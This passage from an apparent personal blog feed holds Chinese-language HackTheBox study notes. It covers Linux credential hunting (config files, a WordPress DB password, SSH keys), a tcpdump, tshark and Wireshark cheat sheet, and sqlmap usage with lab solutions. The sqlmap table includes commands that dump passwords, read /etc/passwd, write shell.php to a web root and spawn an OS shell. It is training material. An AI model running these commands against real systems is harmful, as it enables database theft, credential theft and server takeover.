diff</code></pre><p>我们可以在基于Linux的操作系统上使用诊断工具strace来跟踪和分析系统调用和信号处理。它使我们能够遵循程序的流程，了解程序如何访问系统资源、处理信号以及从操作系统接收和发送数据。此外，我们还可以使用该工具来监控与安全相关的活动，并识别潜在的攻击载体，例如使用密码或令牌向远程主机发出的特定请求。 strace的输出可以写入一个文件以供以后分析，它提供了丰富的选项，可以详细监控程序的行为。</p><pre><code class="shell-session">Tanin@htb[/htb]$ strace ping -c1 10.129.112.20</code></pre><p>如果管理员保持Linux操作系统上几乎所有的配置文件不变，则用户可以读取这些文件。这些配置文件通常可以揭示服务是如何设置和配置的，以便更好地了解我们如何将其用于我们的目的。此外，这些文件可能包含敏感信息，例如我们看不到的文件夹中文件的密钥和路径。但是，如果该文件对每个人都具有读取权限，即使我们没有读取文件夹的权限，我们仍然可以读取该文件。</p><pre><code class="shell-session">Tanin@htb[/htb]$ find / -type f \( -name *.conf -o -name *.config \) -exec ls -l &#123;&#125; \; 2&gt;/dev/null-rw-r--r-- 1 root root 448 Nov 28 12:31 /run/tmpfiles.d/static-nodes.conf-rw-r--r-- 1 root root 71 Nov 28 12:31 /run/NetworkManager/resolv.conf-rw-r--r-- 1 root root 72 Nov 28 12:31 /run/NetworkManager/no-stub-resolv.conf-rw-r--r-- 1 root root 0 Nov 28 12:37 /run/NetworkManager/conf.d/10-globally-managed-devices.conf-rw-r--r-- 1 systemd-resolve systemd-resolve 736 Nov 28 12:31 /run/systemd/resolve/stub-resolv.conf-rw-r--r-- 1 systemd-resolve systemd-resolve 607 Nov 28 12:31 /run/systemd/resolve/resolv.conf...SNIP...</code></pre><p>脚本与配置文件类似。管理员往往懒惰，对网络安全深信不疑，忽视了系统的内部安全。在某些情况下，这些脚本具有错误的特权，我们稍后将对此进行处理，但即使没有这些特权，内容也非常重要。因为通过它们，我们可以发现对我们非常有用的内部和个人过程。</p><h4 id="Scripts"><a href="#Scripts" class="headerlink" title="Scripts"></a>Scripts</h4><pre><code class="shell-session">Tanin@htb[/htb]$ find / -type f -name &quot;*.sh&quot; 2&gt;/dev/null | grep -v &quot;src\|snap\|share&quot;/home/htb-student/automation.sh/etc/wpa_supplicant/action_wpa.sh/etc/wpa_supplicant/ifupdown.sh/etc/wpa_supplicant/functions.sh/etc/init.d/keyboard-setup.sh/etc/init.d/console-setup.sh/etc/init.d/hwclock.sh...SNIP...</code></pre><p>此外，如果我们查看进程列表，它可以为我们提供有关哪些脚本或二进制文件正在使用以及由哪个用户使用的信息。因此，例如，如果它是管理员在其路径中创建的脚本，并且其权限没有受到限制，我们可以在不进入根目录的情况下运行它。</p><h4 id="Running-Services-by-User"><a href="#Running-Services-by-User" class="headerlink" title="Running Services by User"></a>Running Services by User</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ps aux | grep root...SNIP...</code></pre><h1 id="Credential-Hunting"><a href="#Credential-Hunting" class="headerlink" title="Credential Hunting"></a>Credential Hunting</h1><p>枚举系统时，记下任何凭据都很重要。这些可以在配置文件（.conf、.config、.xml等）、shell脚本、用户的bash历史文件、备份（.bak）文件、数据库文件甚至文本文件中找到。凭据可能有助于升级到其他用户，甚至root用户，访问环境中的数据库和其他系统。 &#x2F;var&#x2F;目录通常包含主机上运行的任何web服务器的web根目录。web根可以包含数据库凭证或可以用于进一步访问的其他类型的凭证。一个常见的例子是WordPress配置文件中的MySQL数据库凭据：</p><pre><code class="shell-session">htb_student@NIX02:~$ cat wp-config.php | grep &#39;DB_USER\|DB_PASSWORD&#39;define( &#39;DB_USER&#39;, &#39;wordpressuser&#39; );define( &#39;DB_PASSWORD&#39;, &#39;WPadmin123!&#39; );</code></pre><p>spool 或 mail 目录（如果可以访问）也可能包含有价值的信息甚至凭据。通常可以在web根目录中找到存储在文件中的凭据（即MySQL连接字符串、WordPress配置文件）。</p><pre><code class="shell-session">htb_student@NIX02:~$  find / ! -path &quot;*/proc/*&quot; -iname &quot;*config*&quot; -type f 2&gt;/dev/null</code></pre><p><code>-iname &quot;*config*&quot;</code>：表示忽略文件名大小写，查找包含 “config” 的文件。</p><h2 id="SSH-Keys"><a href="#SSH-Keys" class="headerlink" title="SSH Keys"></a>SSH Keys</h2><p>在系统中搜索可访问的SSH私钥也很有用。我们可能会为另一个更有特权的用户找到一个私钥，我们可以使用该私钥以额外的特权连接回盒子。我们有时还可能找到可以用于访问环境中其他主机的SSH密钥。每当找到SSH密钥时，请检查known_hosts文件以查找目标。此文件包含用户过去连接过的所有主机的公钥列表，可能有助于横向移动或在远程主机上查找可用于对我们的目标执行权限提升的数据。</p><pre><code class="shell-session">htb_student@NIX02:~$  ls ~/.sshid_rsa  id_rsa.pub  known_hosts</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NTA</title>
      <link href="/2023/07/15/NTA/"/>
      <url>/2023/07/15/NTA/</url>
      
        <content type="html"><![CDATA[<p>网络流量分析（NTA）可以被描述为检查网络流量的行为，以表征所使用的公共端口和协议，为我们的环境建立基线，监控和应对威胁，并确保对我们组织的网络有最大可能的了解。</p><span id="more"></span><h1 id="备忘单"><a href="#备忘单" class="headerlink" title="备忘单"></a>备忘单</h1><p>请记住，除非您使用 root，否则执行任何需要绑定网络接口或将其设置为混杂模式的应用程序都需要权限。<code>sudo</code></p><h2 id="无机连接信息"><a href="#无机连接信息" class="headerlink" title="无机连接信息"></a>无机连接信息</h2><ul><li>目标 IP &#x3D;&#x3D; 10.129.43.4</li></ul><h2 id="Tcpdump"><a href="#Tcpdump" class="headerlink" title="Tcpdump"></a>Tcpdump</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>tcpdump --version</code></td><td>打印 tcpdump 和 libpcap 版本字符串，然后退出。</td></tr><tr><td><code>tcpdump -h</code></td><td>打印帮助和使用信息。</td></tr><tr><td><code>tcpdump -D</code></td><td>打印 tcpdump 可以从中捕获的可用网络接口的列表。</td></tr><tr><td><code>tcpdump -i (interface name or #)</code></td><td>执行 tcpdump 并利用指定的要捕获的接口。</td></tr><tr><td><code>tcpdump -i (int) -w file.pcap</code></td><td>在指定的接口上运行捕获并将输出写入文件。</td></tr><tr><td><code>tcpdump -r file.pcap</code></td><td>TCPDump 将从指定的文件中读取输出。</td></tr><tr><td><code>tcpdump -r/-w file.pcap -l | grep &#39;string&#39;</code></td><td>TCPDump 将利用来自实时捕获或文件的捕获流量，并将标准输出设置为行缓冲。然后，我们可以利用管道 （|） 将该输出发送到其他工具（如 grep）以查找字符串或特定模式。</td></tr><tr><td><code>tcpdump -i (int) host (ip)</code></td><td>TCPDump 将在 （int） 指定的接口上启动捕获，并且仅捕获源自或发往 之后指定的 IP 地址或主机名的流量。<code>host</code></td></tr><tr><td><code>tcpdump -i (int) port (#)</code></td><td>将筛选捕获中来自或发往端口 （#） 的任何内容，并丢弃其余内容。</td></tr><tr><td><code>tcpdump -i (int) proto (#)</code></td><td>将筛选捕获以查找与 （#） 匹配的任何协议流量。例如，（6） 将过滤任何 TCP 流量并丢弃其余流量。</td></tr><tr><td><code>tcpdump -i (int) (proto name)</code></td><td>将利用协议公用名来过滤捕获的流量。以TCP&#x2F;UDP&#x2F;ICMP为例。</td></tr></tbody></table><hr><h2 id="Tcpdump-通用开关和过滤器"><a href="#Tcpdump-通用开关和过滤器" class="headerlink" title="Tcpdump 通用开关和过滤器"></a>Tcpdump 通用开关和过滤器</h2><table><thead><tr><th><strong>开关&#x2F;滤波器</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>D</code></td><td>将显示可从中捕获的任何接口。</td></tr><tr><td><code>i</code></td><td>选择要从中捕获的接口。例如 -i eth0</td></tr><tr><td><code>n</code></td><td>不要解析主机名。</td></tr><tr><td><code>nn</code></td><td>不要解析主机名或已知端口。</td></tr><tr><td><code>e</code></td><td>将获取以太网标头以及上层数据。</td></tr><tr><td><code>X</code></td><td>以十六进制和 ASCII 显示数据包的内容。</td></tr><tr><td><code>XX</code></td><td>与 X 相同，但也会指定以太网标头。（如使用 Xe）</td></tr><tr><td><code>v, vv, vvv</code></td><td>增加显示和保存的输出的详细程度。</td></tr><tr><td><code>c</code></td><td>获取特定数量的数据包，然后退出程序。</td></tr><tr><td><code>s</code></td><td>定义要抓取的数据包量。</td></tr><tr><td><code>S</code></td><td>将捕获显示中的相对序列号更改为绝对序列号。（13248765839而不是 101）</td></tr><tr><td><code>q</code></td><td>打印更少的协议信息。</td></tr><tr><td><code>r file.pcap</code></td><td>从文件中读取。</td></tr><tr><td><code>w file.pcap</code></td><td>写入文件</td></tr><tr><td><code>host</code></td><td>主机将过滤可见流量以显示涉及指定主机的任何内容。双向</td></tr><tr><td><code>src / dest</code></td><td><code>src</code>并且是修饰符。我们可以使用它们来指定源或目标主机或端口。<code>dest</code></td></tr><tr><td><code>net</code></td><td><code>net</code>将向我们显示来自或发往指定网络的任何流量。它使用&#x2F;符号。</td></tr><tr><td><code>proto</code></td><td>将筛选特定的协议类型。（以ether，TCP，UDP和ICMP为例）</td></tr><tr><td><code>port</code></td><td><code>port</code>是双向的。它将显示将指定端口作为源或目标的任何流量。</td></tr><tr><td><code>portrange</code></td><td><code>Portrange</code>允许我们指定端口范围。(0-1024)</td></tr><tr><td><code>less / greater &quot;&lt; &gt;&quot;</code></td><td><code>less</code>并可用于查找特定大小的数据包或协议选项。<code>greater</code></td></tr><tr><td><code>and / &amp;&amp;</code></td><td><code>and</code> <code>&amp;&amp;</code>可用于将两个不同的筛选器连接在一起。例如，SRC 主机和端口。</td></tr><tr><td><code>or</code></td><td><code>or</code>或者允许在两个条件中的任何一个上进行匹配。它不必同时满足两者。这可能很棘手。</td></tr><tr><td><code>not</code></td><td><code>not</code>是一个修饰符，表示除 x 以外的任何内容。例如，不是 UDP。</td></tr></tbody></table><hr><h2 id="沙克"><a href="#沙克" class="headerlink" title="沙克"></a>沙克</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>tshark -h</code></td><td>打印帮助菜单。</td></tr><tr><td><code>tshark -D</code></td><td>列出要从中捕获的可用接口。</td></tr><tr><td><code>tshark -i (int)</code></td><td>在所选接口上捕获。将 （int） 替换为接口名称或编号。</td></tr><tr><td><code>tshark -i eth0 -f &quot;host (ip)&quot;</code></td><td>使用 tshark 时应用带有 （-f） 的过滤器以查找特定主机</td></tr><tr><td><code>D</code></td><td>将显示可从中捕获然后退出的任何接口。</td></tr><tr><td><code>L</code></td><td>将列出您可以从中捕获然后退出的链接层介质。（以以太网为例）</td></tr><tr><td><code>i</code></td><td>选择要从中捕获的接口。（-i eth0）</td></tr><tr><td><code>f</code></td><td>libpcap 语法中的数据包过滤器。在捕获期间使用。</td></tr><tr><td><code>c</code></td><td>获取特定数量的数据包，然后退出程序。定义停止条件。</td></tr><tr><td><code>a</code></td><td>定义自动停止条件。它可以是在持续时间、特定文件大小或一定数量的数据包之后。</td></tr><tr><td><code>r (pcap-file)</code></td><td>从文件中读取。</td></tr><tr><td><code>W (pcap-file)</code></td><td>使用 pcapng 格式写入文件。</td></tr><tr><td><code>P</code></td><td>写入文件时将打印数据包摘要 （-W）</td></tr><tr><td><code>x</code></td><td>会将十六进制和 ASCII 输出添加到捕获中。</td></tr><tr><td><code>h</code></td><td>查看帮助菜单</td></tr></tbody></table><hr><h2 id="线鲨"><a href="#线鲨" class="headerlink" title="线鲨"></a>线鲨</h2><table><thead><tr><th><strong>捕获筛选器</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>host x.x.x.x</code></td><td>仅捕获与特定主机相关的流量</td></tr><tr><td><code>net x.x.x.x/24</code></td><td>捕获进出特定网络的流量（使用斜杠表示法指定掩码）</td></tr><tr><td><code>src/dst net x.x.x.x/24</code></td><td>使用 src 或 dst 网络将仅捕获来自指定网络或发往目标网络的流量来源</td></tr><tr><td><code>port #</code></td><td>将过滤掉除您指定的端口之外的所有流量</td></tr><tr><td><code>not</code></td><td>将捕获除指定变量之外的所有内容。前任。<code>not port 80</code></td></tr><tr><td><code>and</code></td><td>AND 将连接您指定的端口。前任。<code>host 192.168.1.1 and port 80</code></td></tr><tr><td><code>portrange x-x</code></td><td>端口范围将仅从范围内的所有端口获取流量</td></tr><tr><td><code>ip / ether / tcp</code></td><td>这些过滤器将仅从指定的协议标头中获取流量。</td></tr><tr><td><code>broadcast / multicast / unicast</code></td><td>获取特定类型的流量。一对一、一对多或一对全部。</td></tr></tbody></table><table><thead><tr><th><strong>显示筛选器</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>ip.addr == x.x.x.x</code></td><td>仅捕获与特定主机相关的流量。这是一个 OR 语句。</td></tr><tr><td><code>ip.addr == x.x.x.x/24</code></td><td>捕获与特定网络相关的流量。这是一个 OR 语句。</td></tr><tr><td><code>ip.src/dst == x.x.x.x</code></td><td>捕获进出特定主机的流量。</td></tr><tr><td><code>dns / tcp / ftp / arp / ip</code></td><td>按特定协议过滤流量。还有更多选择。</td></tr><tr><td><code>tcp.port == x</code></td><td>按特定 TCP 端口进行筛选。</td></tr><tr><td><code>src.port / dst.port ==x</code></td><td>将捕获除指定端口之外的所有内容。</td></tr><tr><td><code>and / or / not</code></td><td>AND 将连接，OR 将找到两个选项中的任何一个，NOT 将排除您的输入选项。</td></tr><tr><td><code>tcp.stream eq #</code></td><td>允许我们跟踪捕获整个流的 tcp 会话。将 （#） 替换为要重新组合的会话。</td></tr><tr><td><code>http</code></td><td>将过滤与 http 协议匹配的任何流量。</td></tr><tr><td><code>http &amp;&amp; image-jfif</code></td><td>此过滤器将显示带有 jpeg 图像文件的任何数据包。</td></tr><tr><td><code>ftp</code></td><td>FTP 协议的筛选器。</td></tr><tr><td><code>ftp.request.command</code></td><td>将过滤通过 ftp 控制通道发送的任何控制命令。</td></tr><tr><td><code>ftp-data</code></td><td>将显示通过 ftp 传输的任何对象。</td></tr></tbody></table><hr><h2 id="杂项命令"><a href="#杂项命令" class="headerlink" title="杂项命令"></a>杂项命令</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>sudo *</code></td><td>Sudo 将运行以提升的权限继续执行的命令。</td></tr><tr><td><code>which (application)</code></td><td>利用 来确定主机上是否安装了（应用程序）。将应用程序替换为您要查找的内容。前任。<code>which tcpdump</code></td></tr><tr><td><code>sudo apt install (application)</code></td><td>使用提升的权限安装应用程序包（如果主机上不存在应用程序包）。前任。<code>sudo apt install wireshark</code></td></tr><tr><td><code>man (application)</code></td><td>显示应用程序的手册页。前任。。<code>man tcpdump</code></td></tr></tbody></table><h4 id="Common-Traffic-Analysis-Tools"><a href="#Common-Traffic-Analysis-Tools" class="headerlink" title="Common Traffic Analysis Tools"></a>Common Traffic Analysis Tools</h4><table><thead><tr><th><strong>Tool</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>tcpdump</code></td><td><a href="https://www.tcpdump.org/">tcpdump</a> is a command-line utility that, with the aid of LibPcap, captures and interprets network traffic from a network interface or capture file.</td></tr><tr><td><code>Tshark</code></td><td><a href="https://www.wireshark.org/docs/man-pages/tshark.html">TShark</a> is a network packet analyzer much like TCPDump. It will capture packets from a live network or read and decode from a file. It is the command-line variant of Wireshark.</td></tr><tr><td><code>Wireshark</code></td><td><a href="https://www.wireshark.org/">Wireshark</a> is a graphical network traffic analyzer. It captures and decodes frames off the wire and allows for an in-depth look into the environment. It can run many different dissectors against the traffic to characterize the protocols and applications and provide insight into what is happening.</td></tr><tr><td><code>NGrep</code></td><td><a href="https://github.com/jpr5/ngrep">NGrep</a> is a pattern-matching tool built to serve a similar function as grep for Linux distributions. The big difference is that it works with network traffic packets. NGrep understands how to read live traffic or traffic from a PCAP file and utilize regex expressions and BPF syntax. This tool shines best when used to debug traffic from protocols like HTTP and FTP.</td></tr><tr><td><code>tcpick</code></td><td><a href="http://tcpick.sourceforge.net/index.php?p=home.inc">tcpick</a> is a command-line packet sniffer that specializes in tracking and reassembling TCP streams. The functionality to read a stream and reassemble it back to a file with tcpick is excellent.</td></tr><tr><td><code>Network Taps</code></td><td>Taps (<a href="https://www.gigamon.com/">Gigamon</a>, <a href="https://www.niagaranetworks.com/products/network-tap">Niagra-taps</a>) are devices capable of taking copies of network traffic and sending them to another place for analysis. These can be in-line or out of band. They can actively capture and analyze the traffic directly or passively by putting the original packet back on the wire as if nothing had changed.</td></tr><tr><td><code>Networking Span Ports</code></td><td><a href="https://en.wikipedia.org/wiki/Port_mirroring">Span Ports</a> are a way to copy frames from layer two or three networking devices during egress or ingress processing and send them to a collection point. Often a port is mirrored to send those copies to a log server.</td></tr><tr><td><code>Elastic Stack</code></td><td>The <a href="https://www.elastic.co/elastic-stack">Elastic Stack</a> is a culmination of tools that can take data from many sources, ingest the data, and visualize it, to enable searching and analysis of it.</td></tr><tr><td><code>SIEMS</code></td><td><code>SIEMS</code> (such as <a href="https://www.splunk.com/en_us">Splunk</a>) are a central point in which data is analyzed and visualized. Alerting, forensic analysis, and day-to-day checks against the traffic are all use cases for a SIEM.</td></tr></tbody></table><h2 id="OSI-x2F-TCP-IP-Models"><a href="#OSI-x2F-TCP-IP-Models" class="headerlink" title="OSI &#x2F; TCP-IP Models"></a>OSI &#x2F; TCP-IP Models</h2><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307151216143.png" alt="image"></p><p>在整个模块中，我们将研究许多不同的协议数据单元（PDU），因此需要对其在理论上和线路上的表现进行功能性理解。PDU是由控制信息和从OSI模型的每一层封装的数据组成的数据包。下面的分组显示两个模型中的层如何与PDU匹配。</p><h4 id="PDU-Example"><a href="#PDU-Example" class="headerlink" title="PDU Example"></a>PDU Example</h4><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307151220699.png" alt="image"></p><p>在检查PDU时，我们需要牢记封装的概念。当我们的数据在协议栈中向下移动时，每一层都会将前一层的数据封装在一个新的气泡中，我们称之为封装。该气泡将该层的必要信息添加到PDU的报头中。这些信息可能因级别而异，但它包括前一层所持有的内容、操作标志、协商通信所需的任何选项、源和目标IP地址、端口、传输以及应用层协议。</p><h4 id="PDU-Packet-Breakdown"><a href="#PDU-Packet-Breakdown" class="headerlink" title="PDU Packet Breakdown"></a>PDU Packet Breakdown</h4><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307151222900.png" alt="image"  /><p>上图显示了一个PDU的组成，与Wireshark的“数据包详细信息”窗格中的数据包分组并排。请注意，当我们在Wireshark中看到突破时，它的顺序是相反的。Wireshark以相反的方式向我们显示PDU，因为它的顺序是未封装的。</p>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap</title>
      <link href="/2023/07/14/sqlmap/"/>
      <url>/2023/07/14/sqlmap/</url>
      
        <content type="html"><![CDATA[<h2 id="GET-x2F-POST-Requests"><a href="#GET-x2F-POST-Requests" class="headerlink" title="GET&#x2F;POST Requests"></a>GET&#x2F;POST Requests</h2><p>在最常见的场景中，GET参数使用选项-u&#x2F;-url提供，如前一个示例所示。对于测试POST数据，可以使用–data标志，如下所示：</p><span id="more"></span><h5 id="备忘单"><a href="#备忘单" class="headerlink" title="备忘单"></a>备忘单</h5><p>备忘单是此模块的有用命令参考。</p><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>sqlmap -h</code></td><td>查看基本帮助菜单</td></tr><tr><td><code>sqlmap -hh</code></td><td>查看高级帮助菜单</td></tr><tr><td><code>sqlmap -u &quot;http://www.example.com/vuln.php?id=1&quot; --batch</code></td><td>在不要求用户输入的情况下运行<code>SQLMap</code></td></tr><tr><td><code>sqlmap &#39;http://www.example.com/&#39; --data &#39;uid=1&amp;name=test&#39;</code></td><td><code>SQLMap</code>带有开机自检请求</td></tr><tr><td><code>sqlmap &#39;http://www.example.com/&#39; --data &#39;uid=1*&amp;name=test&#39;</code></td><td>指定带星号的注入点的 POST 请求</td></tr><tr><td><code>sqlmap -r req.txt</code></td><td>将 HTTP 请求文件传递给<code>SQLMap</code></td></tr><tr><td><code>sqlmap ... --cookie=&#39;PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c&#39;</code></td><td>指定 Cookie 标头</td></tr><tr><td><code>sqlmap -u www.target.com --data=&#39;id=1&#39; --method PUT</code></td><td>指定 PUT 请求</td></tr><tr><td><code>sqlmap -u &quot;http://www.target.com/vuln.php?id=1&quot; --batch -t /tmp/traffic.txt</code></td><td>将流量存储到输出文件</td></tr><tr><td><code>sqlmap -u &quot;http://www.target.com/vuln.php?id=1&quot; -v 6 --batch</code></td><td>指定详细级别</td></tr><tr><td><code>sqlmap -u &quot;www.example.com/?q=test&quot; --prefix=&quot;%&#39;))&quot; --suffix=&quot;-- -&quot;</code></td><td>指定前缀或后缀</td></tr><tr><td><code>sqlmap -u www.example.com/?id=1 -v 3 --level=5</code></td><td>指定级别和风险</td></tr><tr><td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --banner --current-user --current-db --is-dba</code></td><td>基本数据库枚举</td></tr><tr><td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --tables -D testdb</code></td><td>表枚举</td></tr><tr><td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --dump -T users -D testdb -C name,surname</code></td><td>表&#x2F;行枚举</td></tr><tr><td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --dump -T users -D testdb --where=&quot;name LIKE &#39;f%&#39;&quot;</code></td><td>条件枚举</td></tr><tr><td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --schema</code></td><td>数据库架构枚举</td></tr><tr><td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --search -T user</code></td><td>搜索数据</td></tr><tr><td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --passwords --batch</code></td><td>密码枚举和破解</td></tr><tr><td><code>sqlmap -u &quot;http://www.example.com/&quot; --data=&quot;id=1&amp;csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE&quot; --csrf-token=&quot;csrf-token&quot;</code></td><td>反 CSRF 令牌绕过</td></tr><tr><td><code>sqlmap --list-tampers</code></td><td>列出所有篡改脚本</td></tr><tr><td><code>sqlmap -u &quot;http://www.example.com/case1.php?id=1&quot; --is-dba</code></td><td>检查 DBA 权限</td></tr><tr><td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --file-read &quot;/etc/passwd&quot;</code></td><td>读取本地文件</td></tr><tr><td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --file-write &quot;shell.php&quot; --file-dest &quot;/var/www/html/shell.php&quot;</code></td><td>写入文件</td></tr><tr><td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --os-shell</code></td><td>生成操作系统外壳</td></tr></tbody></table><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap &#39;http://www.example.com/&#39; --data &#39;uid=1&amp;name=test&#39;</code></pre><p>在这种情况下，POST参数uid和name将针对SQLi漏洞进行测试。例如，如果我们有一个明确的指示，表明参数uid容易出现SQLi漏洞，我们可以使用-p uid将测试范围缩小到仅此参数。否则，我们可以使用特殊标记*在提供的数据中进行标记，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap &#39;http://www.example.com/&#39; --data &#39;uid=1*&amp;name=test&#39;</code></pre><p>如果我们需要指定一个复杂的HTTP请求，该请求具有许多不同的头值和一个细长的POST主体，我们可以使用-r标志。有了这个选项，SQLMap就有了“请求文件”，将整个HTTP请求包含在一个文本文件中。在一种常见的场景中，可以从专用代理应用程序（例如Burp）中捕获此类HTTP请求，并将其写入请求文件。</p><p>提示：与’–data’选项类似，在保存的请求文件中，我们可以用星号（*）指定要注入的参数，例如’&#x2F;？id&#x3D;*’。</p><p>如果我们想指定一种替代HTTP方法，而不是GET和POST（例如PUT），我们可以使用选项–method，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u www.target.com --data=&#39;id=1&#39; --method PUT</code></pre><h2 id="Custom-HTTP-Requests"><a href="#Custom-HTTP-Requests" class="headerlink" title="Custom HTTP Requests"></a>Custom HTTP Requests</h2><p>除了最常见的表单数据POST主体样式（例如id&#x3D;1）外，SQLMap还支持JSON格式（例如｛“id”:1｝）和XML格式（例如<element><id>1</id></element>）的HTTP请求。 对这些格式的支持是以一种“宽松”的方式实现的；因此，对于参数值如何存储在内部没有严格的约束。如果POST正文相对简单而简短，那么选项–data就足够了。 但是，在POST主体复杂或较长的情况下，我们可以再次使用-r选项</p><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><blockquote><p>target:94.237.62.6:35238</p></blockquote><p><strong>What’s the contents of table flag2? (Case #2 POST parameter)</strong></p><pre><code>sqlmap -u http://94.237.62.6:35238/case2.php --data=&#39;id=*&#39; --batch --dump</code></pre><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307141052194.png" alt="image-20230714105227130"></p><p><strong>What’s the contents of table flag3? (Case #3 Cookie value)</strong></p><pre><code>sqlmap -u http://94.237.62.6:35238/case2.php  --cookie=&#39;id=*&#39; --batch --dump</code></pre><p>这里要注意请求方式变成了get，以及cookie里的参数后面要加一个<code>*</code>不然会显示没有提供参数,（应该相当于在<code>*</code>位置FUZZ所以是否保留参数需要考虑）。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307141122747.png" alt="image-20230714112217706"></p><p> <strong>What’s the contents of table flag4? (Case #4 JSON value)</strong></p><p>这里抓包之后发现json是附在请求末尾：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307141118987.png" alt="image-20230714111845937"></p><p>那么应该不用每次都抓包也能写出一个payload文档</p><pre><code>sqlmap -r test.txt -p id --batch --dump -D testdb -T flag4</code></pre><p>按照示例给的跑实在太慢了动辄十来分钟(后一节的内容都看完了)，还是稍微手工一下，指定更多的参数去找flag</p><h1 id="Handling-SQLMap-Errors"><a href="#Handling-SQLMap-Errors" class="headerlink" title="Handling SQLMap Errors"></a>Handling SQLMap Errors</h1><h2 id="Display-Errors"><a href="#Display-Errors" class="headerlink" title="Display Errors"></a>Display Errors</h2><p>第一步通常是切换–parse-errors，解析DBMS错误（如果有的话），并将其显示为程序运行的一部分：</p><pre><code class="shell-session">...SNIP...[16:09:20] [INFO] testing if GET parameter &#39;id&#39; is dynamic[16:09:20] [INFO] GET parameter &#39;id&#39; appears to be dynamic[16:09:20] [WARNING] parsed DBMS error message: &#39;SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;))&quot;&#39;,),)((&#39; at line 1&#39;&quot;[16:09:20] [INFO] heuristic (basic) test shows that GET parameter &#39;id&#39; might be injectable (possible DBMS: &#39;MySQL&#39;)[16:09:20] [WARNING] parsed DBMS error message: &#39;SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;YzDZJELylInm&#39; at line 1&#39;...SNIP...</code></pre><h2 id="Store-the-Traffic"><a href="#Store-the-Traffic" class="headerlink" title="Store the Traffic"></a>Store the Traffic</h2><p>-t选项将整个流量内容存储到一个输出文件中：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.target.com/vuln.php?id=1&quot; --batch -t /tmp/traffic.txt</code></pre><p>正如我们从上面的输出中看到的，&#x2F;tmp&#x2F;traffic.txt文件现在包含所有发送和接收的HTTP请求。因此，我们现在可以手动调查这些请求，看看问题发生在哪里。</p><h2 id="Verbose-Output"><a href="#Verbose-Output" class="headerlink" title="Verbose Output"></a>Verbose Output</h2><p>另一个有用的标志是-v选项，它提高了控制台输出的详细程度：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.target.com/vuln.php?id=1&quot; -v 6 --batch</code></pre><h2 id="Using-Proxy"><a href="#Using-Proxy" class="headerlink" title="Using Proxy"></a>Using Proxy</h2><p>最后，我们可以使用–proxy选项通过（MiTM）代理（例如Burp）重定向整个流量。这将通过Burp路由所有SQLMap流量，以便我们稍后可以手动调查所有请求，重复它们，并利用Burp的所有功能处理这些请求</p><h1 id="Attack-Tuning"><a href="#Attack-Tuning" class="headerlink" title="Attack Tuning"></a>Attack Tuning</h1><p>在大多数情况下，SQLMap应该随提供的目标详细信息一起开箱即用。尽管如此，仍有一些选项可以微调SQLi注入尝试，以帮助SQLMap进入检测阶段。发送到目标的每个有效载荷包括： vector（例如，UNION ALL SELECT 1,2，VERSION（））：有效负载的中心部分，承载要在目标上执行的有用SQL代码。 边界（例如<code>&lt;vector&gt;-- - </code>）：前缀和后缀形式，用于将向量正确注入易受攻击的SQL语句。</p><h2 id="Prefix-x2F-Suffix"><a href="#Prefix-x2F-Suffix" class="headerlink" title="Prefix&#x2F;Suffix"></a>Prefix&#x2F;Suffix</h2><p>在极少数情况下，需要特殊的前缀和后缀值，常规SQLMap运行不包括这些值。 对于这样的运行，选项–prefix和–suffix可以按如下方式使用：</p><pre><code class="bash">sqlmap -u &quot;www.example.com/?q=test&quot; --prefix=&quot;%&#39;))&quot; --suffix=&quot;-- -&quot;</code></pre><h2 id="Level-x2F-Risk"><a href="#Level-x2F-Risk" class="headerlink" title="Level&#x2F;Risk"></a>Level&#x2F;Risk</h2><p>默认情况下，SQLMap结合了一组预定义的最常见的边界（即前缀&#x2F;后缀对），以及在易受攻击的目标情况下成功几率很高的向量。尽管如此，用户还是有可能使用更大的边界和向量集，这些边界和向量已经合并到SQLMap中。 对于此类需求，应使用选项–级别和–风险： 